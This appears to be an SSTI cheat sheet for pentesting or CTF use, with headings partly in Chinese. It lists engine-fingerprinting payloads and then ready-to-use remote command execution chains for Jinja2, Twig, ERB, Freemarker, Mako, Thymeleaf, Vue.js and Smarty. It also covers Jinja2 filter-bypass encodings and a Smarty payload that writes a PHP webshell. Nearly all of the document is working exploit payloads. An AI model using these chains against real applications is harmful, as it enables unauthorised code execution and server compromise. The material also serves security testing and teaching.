# SSTI Injection Chain Quick Reference

## Template Engine Identification

| Test payload | If the rendered result is | Engine |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | Not Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | Config object | Jinja2 / Twig |

## Jinja2 Injection Chains

### Basic command execution
```python
# Method 1: os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# Method 2: direct import
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# Method 3: lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Method 4: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Method 5: joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Method 6: namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Finding the subclass index
```python
# List all available subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find the index of a specific class
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# Common subclass indices
# catch_warnings: usually between 132-140
# Popen: usually 200+
# _io._IOBase: usually between 80-100
```

### Filter bypass
```python
# Dot is filtered → use |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Underscore is filtered → use \x5f or request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# Square brackets are filtered → use |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Keyword is filtered → concatenate
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Twig Injection Chains

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## ERB (Ruby) 注入链

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Freemarker 注入链

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Mako 注入链

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Thymeleaf 注入链

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Vue.js 模板注入

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Smarty 注入链

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```
